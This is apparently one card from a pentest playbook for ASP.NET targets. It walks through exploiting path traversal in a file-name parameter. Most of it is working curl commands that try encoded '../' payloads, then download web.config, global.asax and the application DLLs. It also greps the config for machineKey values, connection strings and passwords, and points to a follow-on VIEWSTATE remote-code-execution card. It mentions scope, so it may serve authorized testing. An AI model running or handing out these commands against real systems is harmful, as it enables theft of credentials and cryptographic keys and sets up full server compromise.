# Batch 03 — Read files → web.config → DLLs

## GOAL
If a parameter is a file name, climb out with `../` and grab config + app DLLs.

## TIME
~1 hour

## YOU NEED
- URL with file param (`fileName`, `file`, `path`, …)
- File-read allowed in scope

---

## WHY (30 seconds)

Bad C# often does:

```text
open( folder + user_input )
```

If user_input is `../../web.config`, you leave the folder and read the app’s **settings file**.  
`web.config` can hold:

- database passwords  
- **machineKey** (needed for VIEWSTATE RCE next card)  
- names of DLLs in `bin/`

DLLs = compiled app code you can reverse later.

---

## DO THIS

```bash
# CHANGE to real endpoint
BASE="https://TARGET/v1/DownloadCategoryExcel"
```

### 1) Prove `../` works

```bash
for p in '../../web.config' '..%2f..%2fweb.config' '..\..\web.config'; do
  echo "=== $p ==="
  curl -sk -G "$BASE" --data-urlencode "fileName=$p" -D- -o /tmp/out | head -12
  file /tmp/out; head -c 180 /tmp/out; echo
done
```

### 2) Save gold files

```bash
curl -sk -G "$BASE" --data-urlencode "fileName=../../web.config" -o web.config
curl -sk -G "$BASE" --data-urlencode "fileName=../../global.asax" -o global.asax
grep -iE 'machineKey|connectionString|password' web.config
```

### 3) Pull DLLs named in config

```bash
# change Company.Web.Api.dll to a name you saw
curl -sk -G "$BASE" --data-urlencode "fileName=../../bin/Company.Web.Api.dll" \
  -o Company.Web.Api.dll
file Company.Web.Api.dll
```

### 4) Write down

```text
LFI: yes/no
machineKey: yes/no
DLLs saved:
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| machineKey lines | → **04** |
| DLLs only | → **05** |
| No LFI | → **06** if XML, **07** shortnames, **05** if vendor paths |

---

## NEXT
→ [04-viewstate-rce.md](./04-viewstate-rce.md) or [05-dnspy-dependencies.md](./05-dnspy-dependencies.md)
